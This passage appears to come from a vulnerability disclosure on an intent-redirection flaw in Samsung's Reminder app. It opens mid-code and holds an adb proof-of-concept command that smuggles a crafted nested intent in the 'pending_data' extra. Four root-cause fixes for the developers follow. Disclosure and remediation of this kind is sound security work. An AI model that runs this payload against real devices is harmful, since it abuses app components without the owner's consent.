startActivity(reach)
```

**adb variant:**
```
adb shell am start -a android.intent.action.VIEW \
  -d "uuid://reminder.uuid/dummy" \
  -n com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity \
  --ei pending_request 100 --ei pending_result -1 \
  --es pending_data "intent:#Intent;action=android.intent.action.VIEW;type=image/*;component=com.samsung.android.app.reminder/com.samsung.android.app.reminder.ui.detail.view.DetailActivity;end"
```

### Root-cause fixes
1. Validate `uri.getPackage()` and `uri.getComponent()` after `parseUri` in `D.l`, rejecting anything not fully qualified to `com.samsung.android.app.reminder`.
2. Strip `uri.getSelector()`, URI-permission `FLAG_GRANT_*` flags, and `FLAG_ACTIVITY_*` flags before forwarding to `h`.
3. Persist `pending_data` not as a `toUri(1)` string but as a typed Parcelable in a private key, only consumable on `savedInstanceState` restore (not on first onCreate).
4. Gate the `pending_request`/`pending_data` path behind `getCallingPackage()` equality to `com.samsung.android.app.reminder` so only intra-app restorations ride it.

